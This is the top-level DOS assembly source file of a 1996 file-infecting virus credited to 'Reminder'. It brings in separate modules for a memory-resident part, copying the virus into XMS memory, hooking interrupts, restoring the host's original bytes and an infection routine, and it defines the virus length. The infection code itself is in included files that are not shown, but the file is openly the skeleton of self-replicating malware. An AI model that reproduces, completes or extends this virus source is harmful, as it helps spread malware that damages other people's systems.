; (c) Reminder (1996)

.model tiny
.code
org 100h
start:

jmp main_@1
include rez_part.inc		; rez_part (in 1th mcb) if 3eh called main part 
main_@1:
;------main_part--------
include init_xms.inc 		; initxms_&_copy_virii_2_xms
include init_mem.inc		; initmem_on_first_mcb_&_copy_rez_part_2_mcb
include hook_int.inc		; hook interrupts
include restore.inc		; restore original bytes & quit
include infect.inc		; infect procedure
virlen 	equ $-start
mainlen	equ $-main_@1

end start
